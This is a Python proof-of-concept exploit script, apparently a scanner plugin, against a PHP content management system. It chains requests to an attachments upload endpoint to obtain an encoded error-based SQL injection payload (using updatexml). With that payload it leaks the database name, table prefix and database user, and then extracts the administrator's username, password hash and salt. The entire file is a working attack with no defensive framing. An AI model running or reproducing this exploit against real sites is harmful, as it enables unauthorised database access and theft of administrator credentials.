import sys
import urllib

import requests

from lib.core.data import target


def poc():
    try:
        if not target.url.endswith("index.php"):
            print("[*] Please make sure the url end with 'index.php'")
            exit()
        url = target.url

        sqli_prefix = '%*27an*d%20'
        sqli_info = 'updatexml(1,concat(1,(user())),1)'
        sqli_password1 = 'updatexml(1,concat(1,(select concat(0x6368796265746124,username,0x3a,password,0x3a,encrypt,0x6368796265746124) from '
        sqli_password2 = '_admin limit 0,1)),1)'
        sqli_padding = '%23%26m%3D1%26f%3Dwobushou%26modelid%3D2%26catid%3D6'

        step1 = url + '?m=wap&a=index&siteid=1'
        r = requests.get(step1)
        post = {"userid_flash": r.cookies["GPYAh_siteid"]}
        print('[+] Get Cookie : ' + r.cookies["GPYAh_siteid"])

        step2 = url + "?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=" + sqli_prefix + sqli_info + sqli_padding
        r = requests.post(step2, data=post)
        sqli_payload = r.cookies["GPYAh_att_json"]
        print('[+] Get SQLi Payload : ' + sqli_payload)

        step3 = url + '?m=content&c=down&a_k=' + sqli_payload
        html = requests.get(step3).text

        db_start = html.find("SELECT * FROM `") + len("SELECT * FROM `")
        db_end = html.find("`.`")
        Database = html[db_start:db_end]
        print("[+] Get Database Name: " + Database)

        tableprefix_start = html.find("`.`") + len("`.`")
        tableprefix_end = html.find("_download_data")
        tableprefix = html[tableprefix_start:tableprefix_end]
        print("[+] Get Table Prefix: " + tableprefix)

        startIndex = html.find("XPATH syntax error: '") + len(
            "XPATH syntax error: '")
        endIndex = html.find("' <br /> <b>MySQL Errno")
        database_user = html[startIndex:endIndex]
        print("[+] Get Database-user Information : " + database_user)

        step4 = url + "/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=" + sqli_prefix + sqli_password1 + tableprefix + sqli_password2 + sqli_padding
        r = requests.post(step4, data=post)
        sqli_payload = r.cookies["GPYAh_att_json"]

        setp5 = url + '/index.php?m=content&c=down&a_k=' + sqli_payload
        html = requests.get(setp5).text
        startIndex = html.find("XPATH syntax error: '") + len(
            "XPATH syntax error: '")
        endIndex = html.find("' <br /> <b>MySQL Errno")
        admin_passwd = html[startIndex:endIndex]
        print("[+] Get User Passwd: " + admin_passwd)

    except KeyError as e:

        print(
            "\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m"
        )
